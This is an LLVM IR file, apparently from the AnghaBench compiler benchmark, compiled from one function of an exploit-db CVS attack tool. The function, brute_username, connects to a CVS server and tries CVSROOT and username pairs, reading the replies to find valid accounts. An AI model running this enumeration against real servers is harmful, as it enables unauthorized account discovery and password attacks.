; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_username.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_username.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i64 }
%struct.TYPE_3__ = type { i32, i64 }

@.str = private unnamed_addr constant [28 x i8] c"Bruteforcing cvs login... \0A\00", align 1
@CVSROOTS = common dso_local global %struct.TYPE_4__* null, align 8
@root = common dso_local global i64 0, align 8
@USERNAMES = common dso_local global %struct.TYPE_3__* null, align 8
@.str.1 = private unnamed_addr constant [33 x i8] c"Trying cvsroot = %s, login = %s\09\00", align 1
@host = common dso_local global i32 0, align 4
@port = common dso_local global i32 0, align 4
@CVS_VERIF = common dso_local global i32 0, align 4
@DUMMY = common dso_local global i32 0, align 4
@CVS_NO_USER = common dso_local global i32 0, align 4
@BAD_TRIP = common dso_local global i32 0, align 4
@CVS_AUTH_FAILED = common dso_local global i32 0, align 4
@CVS_AUTH_SUCCESS = common dso_local global i32 0, align 4
@GOOD_TRIP = common dso_local global i8* null, align 8
@user = common dso_local global i64 0, align 8
@pass = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @brute_username() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  %6 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %7

7:                                                ; preds = %142, %0
  %8 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %9 = load i32, i32* %3, align 4
  %10 = sext i32 %9 to i64
  %11 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i64 %10
  %12 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %11, i32 0, i32 1
  %13 = load i64, i64* %12, align 8
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %145

15:                                               ; preds = %7
  %16 = load i64, i64* @root, align 8
  %17 = icmp ne i64 %16, 0
  br i1 %17, label %27, label %18

18:                                               ; preds = %15
  %19 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %20 = load i32, i32* %3, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %19, i64 %21
  %23 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 8
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %27

26:                                               ; preds = %18
  br label %142

27:                                               ; preds = %18, %15
  store i32 0, i32* %2, align 4
  br label %28

28:                                               ; preds = %133, %27
  %29 = load %struct.TYPE_3__*, %struct.TYPE_3__** @USERNAMES, align 8
  %30 = load i32, i32* %2, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %32, i32 0, i32 1
  %34 = load i64, i64* %33, align 8
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %36, label %136

36:                                               ; preds = %28
  %37 = load i64, i64* @root, align 8
  %38 = icmp ne i64 %37, 0
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i64, i64* @root, align 8
  %41 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %42 = load i32, i32* %3, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %41, i64 %43
  %45 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %44, i32 0, i32 1
  store i64 %40, i64* %45, align 8
  br label %46

46:                                               ; preds = %39, %36
  %47 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %48 = load i32, i32* %3, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %47, i64 %49
  %51 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %50, i32 0, i32 1
  %52 = load i64, i64* %51, align 8
  %53 = load %struct.TYPE_3__*, %struct.TYPE_3__** @USERNAMES, align 8
  %54 = load i32, i32* %2, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %53, i64 %55
  %57 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %56, i32 0, i32 1
  %58 = load i64, i64* %57, align 8
  %59 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i64 %52, i64 %58)
  %60 = load i32, i32* @host, align 4
  %61 = load i32, i32* @port, align 4
  %62 = call i32 @nopen(i32 %60, i32 %61)
  %63 = load i32, i32* @CVS_VERIF, align 4
  %64 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %64, i64 %66
  %68 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %67, i32 0, i32 1
  %69 = load i64, i64* %68, align 8
  %70 = load %struct.TYPE_3__*, %struct.TYPE_3__** @USERNAMES, align 8
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %70, i64 %72
  %74 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %73, i32 0, i32 1
  %75 = load i64, i64* %74, align 8
  %76 = load i32, i32* @DUMMY, align 4
  %77 = call i32 @scramble(i32 %76)
  %78 = call i32 @nprintf(i32 %63, i64 %69, i64 %75, i32 %77)
  %79 = call i8* (...) @flush_sock()
  store i8* %79, i8** %5, align 8
  %80 = call i32 (...) @nclose()
  %81 = load i8*, i8** %5, align 8
  %82 = load i32, i32* @CVS_NO_USER, align 4
  %83 = call i64 @strstr(i8* %81, i32 %82)
  %84 = icmp ne i64 %83, 0
  br i1 %84, label %85, label %91

85:                                               ; preds = %46
  %86 = load i32, i32* @BAD_TRIP, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = load i8*, i8** %5, align 8
  %90 = call i32 (i8*, ...) @info(i8* %88, i8* %89)
  br label %130

91:                                               ; preds = %46
  %92 = load i8*, i8** %5, align 8
  %93 = load i32, i32* @CVS_AUTH_FAILED, align 4
  %94 = call i64 @strstr(i8* %92, i32 %93)
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %101, label %96

96:                                               ; preds = %91
  %97 = load i8*, i8** %5, align 8
  %98 = load i32, i32* @CVS_AUTH_SUCCESS, align 4
  %99 = call i64 @strstr(i8* %97, i32 %98)
  %100 = icmp ne i64 %99, 0
  br i1 %100, label %101, label %129

101:                                              ; preds = %96, %91
  %102 = load i8*, i8** @GOOD_TRIP, align 8
  %103 = call i32 (i8*, ...) @info(i8* %102)
  %104 = load %struct.TYPE_4__*, %struct.TYPE_4__** @CVSROOTS, align 8
  %105 = load i32, i32* %3, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %104, i64 %106
  %108 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = load %struct.TYPE_3__*, %struct.TYPE_3__** @USERNAMES, align 8
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %110, i64 %112
  %114 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %113, i32 0, i32 0
  store i32 %109, i32* %114, align 8
  %115 = load %struct.TYPE_3__*, %struct.TYPE_3__** @USERNAMES, align 8
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %115, i64 %117
  %119 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %118, i32 0, i32 1
  %120 = load i64, i64* %119, align 8
  store i64 %120, i64* @user, align 8
  %121 = load i64, i64* @pass, align 8
  %122 = icmp ne i64 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %101
  %124 = load i8*, i8** %5, align 8
  %125 = call i32 @free(i8* %124)
  store i32 1, i32* %1, align 4
  br label %147

126:                                              ; preds = %101
  %127 = load i32, i32* %4, align 4
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %4, align 4
  br label %129

129:                                              ; preds = %126, %96
  br label %130

130:                                              ; preds = %129, %85
  %131 = load i8*, i8** %5, align 8
  %132 = call i32 @free(i8* %131)
  br label %133

133:                                              ; preds = %130
  %134 = load i32, i32* %2, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %2, align 4
  br label %28

136:                                              ; preds = %28
  %137 = load i64, i64* @root, align 8
  %138 = icmp ne i64 %137, 0
  br i1 %138, label %139, label %141

139:                                              ; preds = %136
  %140 = load i32, i32* %4, align 4
  store i32 %140, i32* %1, align 4
  br label %147

141:                                              ; preds = %136
  br label %142

142:                                              ; preds = %141, %26
  %143 = load i32, i32* %3, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %3, align 4
  br label %7

145:                                              ; preds = %7
  %146 = load i32, i32* %4, align 4
  store i32 %146, i32* %1, align 4
  br label %147

147:                                              ; preds = %145, %139, %123
  %148 = load i32, i32* %1, align 4
  ret i32 %148
}

declare dso_local i32 @info(i8*, ...) #1

declare dso_local i32 @nopen(i32, i32) #1

declare dso_local i32 @nprintf(i32, i64, i64, i32) #1

declare dso_local i32 @scramble(i32) #1

declare dso_local i8* @flush_sock(...) #1

declare dso_local i32 @nclose(...) #1

declare dso_local i64 @strstr(i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
